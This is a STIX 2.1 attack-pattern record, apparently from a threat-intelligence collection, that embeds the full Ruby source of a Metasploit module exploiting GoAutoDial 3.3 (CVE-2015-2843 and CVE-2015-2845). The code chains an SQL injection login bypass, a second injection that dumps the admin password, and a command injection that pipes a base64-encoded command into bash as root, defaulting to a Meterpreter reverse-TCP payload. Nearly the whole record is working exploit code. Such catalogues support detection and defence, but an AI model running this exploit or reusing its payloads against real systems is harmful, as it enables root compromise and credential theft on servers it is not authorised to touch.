{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01500085-e1f2-4d76-9c9f-b5b540b97bce",
    "created": "2024-08-14T17:03:03.876377Z",
    "modified": "2024-08-14T17:03:03.876381Z",
    "name": "GoAutoDial 3.3 Authentication Bypass / Command Injection",
    "description": " This module exploits a SQL injection flaw in the login functionality for GoAutoDial version 3.3-1406088000 and below, and attempts to perform command injection. This also attempts to retrieve the admin user details, including the cleartext password stored in the underlying database. Command injection will be performed with root privileges.  This module has been tested successfully on GoAutoDial version 3.3-1406088000.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/goautodial_3_rce_command_injection.rb",
            "external_id": "goautodial_3_rce_command_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2843"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2845"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'GoAutoDial 3.3 Authentication Bypass / Command Injection',\n      'Description'     => %q{\n        This module exploits a SQL injection flaw in the login functionality for GoAutoDial version 3.3-1406088000 and below, and attempts to perform command injection. This also attempts to retrieve the admin user details, including the cleartext password stored in the underlying database. Command injection will be performed with root privileges.\n\n        This module has been tested successfully on GoAutoDial version 3.3-1406088000.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Chris McCurley',  # Discovery & Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2015-2843'],\n          ['CVE', '2015-2845']\n        ],\n      'Platform'        => 'linux',\n      'Arch'            => [ ARCH_X86, ARCH_X64 ],\n      'Targets'         => [ ['Automatic', {} ] ],\n      'DefaultOptions'  =>\n        {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'CMDSTAGER::FLAVOR' => 'echo'\n        },\n      'CmdStagerFlavor' => %w{ echo printf wget },\n      'DefaultTarget'   => 0,\n      'Privileged'      => true,\n      'DisclosureDate'  => '2015-04-21'))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 443]),\n        OptBool.new('SSL', [false, 'Use SSL', true]),\n        OptString.new('TARGETURI', [true, 'The base path', '/'])\n      ])\n  end\n\n\n  def check\n    res = check_version\n\n    unless res\n      vprint_error \"#{peer} Connection failed\"\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200 && res.body =~ /goautodial/\n      return CheckCode::Safe\n    end\n\n    unless res.body =~ /1421902800/\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  end\n\n  def check_version\n    uri = target_uri.path\n\n    send_request_cgi({\n      'uri'     => normalize_uri(uri, 'changelog.txt'),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0',\n        'Accept-Encoding' => 'identity'\n      }\n    })\n  end\n\n  def sqli_auth_bypass\n    uri = target_uri.path\n\n    send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(uri, 'index.php', 'go_login', 'validate_credentials'),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0',\n        'Accept-Encoding' => 'identity'\n      },\n      'vars_post' => {\n        'user_name' => 'admin',\n        'user_pass' => \"' or '\"\n      }\n    })\n  end\n\n  def sqli_admin_pass\n   uri = target_uri.path\n\n   send_request_cgi({\n      'uri'     => normalize_uri(uri, 'index.php', 'go_site', 'go_get_user_info', Rex::Text.uri_encode(\"' OR active='Y\")),\n      'cookie'  => @cookie,\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0',\n        'Accept-Encoding' => 'identity'\n      }\n    })\n  end\n\n  #\n  # Run the command stager\n  #\n  def execute_command(cmd, opts = {})\n\n    params = \"|echo -n #{Rex::Text.encode_base64(cmd)} |base64 --decode|bash\"\n    uri = target_uri.path\n\n    send_request_cgi({\n      'uri'     => normalize_uri(uri, 'index.php', 'go_site', 'cpanel', Rex::Text.uri_encode(params)),\n      'cookie'  => @cookie,\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0',\n        'Accept-Encoding' => 'identity'\n      }\n    })\n  end\n\n  def exploit\n    print_status(\"#{peer} - Trying SQL injection...\")\n    res = sqli_auth_bypass\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed')\n    end\n\n    if res.code == 200 && res.get_cookies.include?('go_session')\n      print_good(\"#{peer} - Authentication Bypass (SQLi) was successful\")\n    else\n      fail_with(Failure::NotVulnerable, \"Run 'check' command to identify whether the auth bypass has been fixed\")\n    end\n\n    @cookie = res.get_cookies\n    print_status(\"#{peer} - Dumping admin password...\")\n    res = sqli_admin_pass\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed')\n    end\n\n    # Example response: admin|goautodial|Admin|||Y\n    if res.body.include?('|')\n      print_good(\"#{peer} - Found credentials: #{res.body}\")\n    else\n      fail_with(Failure::NotVulnerable, 'No creds returned, possible mitigations are in place.')\n    end\n\n    print_status(\"#{peer} - Sending payload...\")\n    execute_cmdstager(:linemax => 800)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}